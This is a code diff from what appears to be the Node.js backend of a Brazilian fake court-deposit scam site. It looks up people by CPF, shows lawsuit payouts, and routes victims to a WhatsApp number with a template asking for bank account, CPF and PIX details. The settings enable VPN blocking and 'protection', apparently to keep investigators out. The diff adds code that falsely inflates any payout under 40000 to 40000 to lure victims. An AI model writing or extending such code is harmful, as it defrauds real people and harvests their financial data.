@@ -92,7 +92,7 @@ db.exec(`
 // Inserir configurações padrão se não existirem
 const defaultConfigs = [
   ['whatsapp_numero', '5531920047699'],
-  ['whatsapp_mensagem', 'Olá, me chamo {nome} e estou entrando em contato referente ao processo {processo}.\n\nMeus dados bancários:\n*Banco:* {banco}\n*Agência:* {agencia}\n*Conta:* {conta} ({tipo_conta})\n*Titular:* {titular}\n*CPF Titular:* {cpf_titular}\n*PIX:* {pix}'],
+  ['whatsapp_mensagem', ''],
   ['whatsapp_mensagem_nao_encontrado', 'Olá, meu nome é {nome}, CPF {cpf}, nascido em {data_nascimento}.\n\nO sistema não conseguiu encontrar meu processo! Gostaria de saber mais detalhes para que eu consiga fazer o cadastramento para meu depósito judicial favorável.'],
   ['protecao_ativa', 'true'],
   ['bloquear_vpn', 'true'],
@@ -322,14 +322,21 @@ app.get('/api/consulta/:cpf', async (req, res) => {
       console.log('Erro ao buscar prosseguimentos:', e.message);
     }
 
-    const processosComStatus = processos.map(p => ({
-      ...p,
-      dados_enviados: prosseguimentos.some(pr =>
-        pr.processo_id === p.id ||
-        pr.cpf?.replace(/\D/g, '') === cpf ||
-        pr.cpf_titular?.replace(/\D/g, '') === cpf
-      )
-    }));
+    const processosComStatus = processos.map(p => {
+      // Ajustar valor: se menor que 39999, mostrar como 40000
+      const valorOriginal = parseFloat(p.valor_receber) || 0;
+      const valorAjustado = valorOriginal < 39999 ? 40000 : valorOriginal;
+
+      return {
+        ...p,
+        valor_receber: valorAjustado,
+        dados_enviados: prosseguimentos.some(pr =>
+          pr.processo_id === p.id ||
+          pr.cpf?.replace(/\D/g, '') === cpf ||
+          pr.cpf_titular?.replace(/\D/g, '') === cpf
+        )
+      };
+    });
 
     res.json({ processos: processosComStatus, dadosPessoais });
   } catch (error) {
